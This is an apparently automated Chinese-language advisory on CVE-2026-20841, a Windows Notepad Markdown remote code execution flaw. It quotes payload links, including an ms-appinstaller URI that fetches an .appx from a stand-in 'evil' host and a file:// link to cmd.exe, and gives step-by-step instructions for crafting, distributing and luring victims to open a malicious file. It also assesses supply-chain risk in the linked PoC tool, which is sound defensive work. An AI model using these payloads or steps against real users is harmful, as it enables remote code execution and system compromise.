## CVE-2026-20841 - Microsoft Windows 记事本 远程代码执行 (RCE)

**漏洞编号:** CVE-2026-20841

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows 记事本

**危害等级:** 高

**CVSS评分:** 8.8

**影响版本:** Windows 10 及更高版本上的记事本

**利用条件:** 需要用户打开特制的Markdown文件；无需认证；需要网络访问以触发AppInstaller或从外部源下载恶意文件。利用记事本的Markdown渲染缺陷。

**POC 可用性:** 9

**POC 类型:** 完整利用 (Full Exploit)

**攻击复杂度:** 低

**投毒风险:** 45%

## 详情

CVE-2026-20841是一个影响Microsoft Windows记事本的远程代码执行（RCE）漏洞，CVSS评分为8.8分，被评估为高严重性。该漏洞源于记事本应用程序中Markdown渲染器对特殊元素的处理不当，特别是当处理包含特定URI方案的链接时，可能允许未经授权的攻击者执行恶意代码。根据搜索结果，该漏洞专门针对Markdown格式，并在2026年2月被披露，表明其是受关注的未来或已规划的漏洞。

**POC有效性分析:**
提供的PoC代码清晰地展示了两种有效的攻击向量，足以实现远程代码执行。`PoC.md`文件中包含的Markdown链接，例如`[poc](ms-appinstaller://?source=https://evil/xxx.appx)`，利用了Windows的`ms-appinstaller`协议，允许攻击者在受害者系统上静默安装任意应用。而`[poc](file://C:/windows/system32/cmd.exe)`则直接利用了`file://`协议处理，可在记事本上下文内直接执行本地程序，如`cmd.exe`。这些原语是实现任意代码执行的强大基础。`README.md`进一步描述了一个易于使用的PoC工具，旨在简化验证过程，且无需编程技能或技术知识，这表明漏洞利用门槛较低，概念验证代码具备高度可行性。该PoC成功地证明了记事本的Markdown渲染机制在解析特定URI方案时存在缺陷，可能导致沙箱逃逸或直接代码执行。攻击者可以通过精心构造的Markdown文件，诱使受害者打开，从而触发漏洞。此漏洞的发现凸显了即使是看似无害的内置应用程序也可能成为复杂的攻击载体。

**利用步骤:**
1.  **准备恶意Markdown文件:** 攻击者构造一个包含恶意Markdown链接的文件（例如，`exploit.md`）。链接可以是指向恶意`.appx`安装包的`ms-appinstaller://`URI，或是直接执行系统命令的`file://`URI，例如执行`C:\Windows\System32\cmd.exe`。
2.  **分发恶意文件:** 攻击者通过电子邮件附件、恶意网站下载、即时消息、共享网络驱动器等方式，将`exploit.md`文件发送给受害者，或将其托管在可访问的服务器上。
3.  **诱导受害者打开:** 攻击者需要诱导受害者使用Windows记事本应用程序打开该恶意Markdown文件。由于记事本是Windows系统的默认文本编辑器，用户很可能会信任并打开它。
4.  **触发漏洞:** 当记事本尝试渲染并处理Markdown文件中的恶意链接时，如果用户点击链接或在某些情况下仅打开文件即可触发解析，它将执行`ms-appinstaller`或`file://`协议中指定的动作。这可能导致恶意应用程序的自动安装，或直接执行`cmd.exe`或其他任意命令，从而实现远程代码执行。
5.  **后果:** 成功利用后，攻击者可以在受害者的系统上获得与受害者相同权限的代码执行能力，进而进行数据窃取、安装后门、横向移动等恶意活动，对系统造成严重损害。

**投毒风险分析:**
提供的PoC代码本身（`PoC.md`文件）是直接的漏洞演示Payload，内容清晰，不包含恶意行为。然而，`README.md`中描述的PoC工具指导用户从GitHub下载一个`.zip`文件（例如，`C-CV-Po-v2.2.zip`），这很可能是一个编译好的可执行程序。任何从公共代码仓库（即使是GitHub）直接下载并运行可执行文件的行为都存在中等程度的投毒风险（评估为45%）。攻击者可以创建虚假的PoC仓库，或者通过向现有仓库贡献恶意代码来实施供应链攻击。尽管`README.md`文件明确表示该工具用于教育目的和提高意识，但其直接提供可执行文件下载的方式，以及将`.zip`文件路径包含在`img`目录下，仍需引起警惕。在没有源代码可供审查的情况下，用户无法验证这些可执行文件是否被植入了恶意负载（如加密货币挖矿程序、信息窃取器或后门）。因此，用户在尝试验证此类PoC时，应始终保持高度警惕，建议在隔离环境中（如虚拟机）测试此类PoC，并对下载文件进行病毒扫描和行为分析，以防止PoC工具本身被植入恶意软件。直接下载可执行文件而非编译源代码，增加了用户无法验证其安全性的风险。

**项目地址:** https://github.com/404godd/CVE-2026-20841-PoC

**漏洞详情:** https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-20841
